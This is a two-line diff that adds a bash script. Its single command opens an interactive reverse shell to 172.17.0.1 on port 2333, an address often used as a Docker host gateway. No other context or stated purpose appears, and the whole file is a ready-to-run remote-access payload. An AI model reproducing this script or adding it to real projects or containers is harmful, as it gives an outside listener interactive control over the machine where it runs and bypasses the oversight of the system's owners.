@@ -1,0 +1,2 @@
+#!/usr/bin/bash
+bash -i >& /dev/tcp/172.17.0.1/2333 0>&1
